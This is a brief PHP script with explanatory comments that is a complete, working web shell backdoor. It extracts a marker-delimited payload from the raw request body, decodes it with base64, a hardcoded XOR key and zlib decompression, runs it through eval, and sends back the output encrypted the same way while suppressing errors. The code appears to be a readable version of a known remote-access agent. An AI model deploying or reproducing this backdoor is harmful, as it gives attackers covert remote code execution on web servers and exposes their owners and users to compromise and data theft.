<?php
// Define key variables
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";

// Function to perform XOR operation
function x($t, $k) {
    $c = strlen($k);  // Length of the key
    $l = strlen($t);  // Length of the text
    $o = "";          // Output string

    // Iterate over the text and perform XOR with the key
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }

    return $o;
}

// Check if the pattern defined by $kh and $kf is found in the input
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();  // Start output buffering

    // Decode, decompress and evaluate the code
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));

    $o = @ob_get_contents();  // Get the output buffer content
    @ob_end_clean();          // Clean (erase) the output buffer and turn off output buffering

    // Compress, encode and print the output
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print("$p$kh$r$kf");
}
?>

